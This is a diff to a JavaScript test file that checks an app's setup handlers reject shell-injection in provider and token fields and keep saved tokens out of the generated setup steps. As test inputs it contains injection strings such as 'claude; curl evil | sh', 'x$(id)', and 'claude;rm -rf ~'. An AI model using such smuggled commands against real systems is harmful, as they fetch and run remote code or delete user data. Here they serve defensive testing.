@@ -120,7 +120,15 @@ test('gh handlers: PR, comment, run and check ids must be plain numbers', async 
   }
 });
 
-test('Nemesis setup handler and remote steps refuse unsafe provider or token', () => {
+test('Nemesis setup handler and remote steps refuse unsafe provider or token', async (t) => {
+  // The handler only sets up a saved profile.
+  const { loadConfig, saveConfig, flushSaveConfig } = require('../../main/util/config');
+  const before = JSON.parse(JSON.stringify(loadConfig()));
+  t.after(async () => { saveConfig(before); await flushSaveConfig(); });
+  const cfg = loadConfig();
+  cfg.nemesisProfiles = [{ id: 'n8-m', name: 'M', remote: '', token: '', provider: '', model: '' }];
+  saveConfig(cfg);
+  await flushSaveConfig();
   // tasks.js starts the pre-commit hook's socket server on load, which would
   // keep this test process alive; it isn't what's under test.
   const hook = require('../../main/state/precommit-hook');
@@ -128,13 +136,16 @@ test('Nemesis setup handler and remote steps refuse unsafe provider or token', (
   hook.startPrecommitServer = () => {};
   let tasks;
   try { tasks = handlersOf('../../main/ipc/tasks'); } finally { hook.startPrecommitServer = realStart; }
-  const r = tasks.get('nemesis-setup-local')({}, { provider: 'claude; curl evil | sh', token: 'a1b2c3d4e5f6' });
+  const r = await tasks.get('nemesis-setup-local')({}, { profileId: 'n8-m', provider: 'claude; curl evil | sh', token: 'a1b2c3d4e5f6' });
   assert.match(r.error, /plain name/);
-  assert.match(tasks.get('nemesis-setup-local')({}, { provider: 'claude', token: 'x$(id)xxxxxx' }).error, /plain name/);
+  assert.match((await tasks.get('nemesis-setup-local')({}, { profileId: 'n8-m', provider: 'claude', token: 'x$(id)xxxxxx' })).error, /plain name/);
   const { remoteSetupSteps } = require('../../main/ipc/windows-ipc');
   const steps = remoteSetupSteps('darwin', 'claude;rm -rf ~', 'tok$(id)tok').join('\n');
   assert.ok(!steps.includes('rm -rf') && !steps.includes('$(id)'), steps);
-  assert.match(remoteSetupSteps('darwin', 'claude', 'a1b2c3d4e5f6').join('\n'), /--provider claude[\s\S]*"a1b2c3d4e5f6"/);
+  // The steps reach the page, so the saved token is never inlined in them.
+  const good = remoteSetupSteps('darwin', 'claude', 'a1b2c3d4e5f6').join('\n');
+  assert.match(good, /--provider claude/);
+  assert.ok(!good.includes('a1b2c3d4e5f6'), good);
 });
 
 test('notifications refuse a non-webhook URL saved in settings, not just on test', async () => {
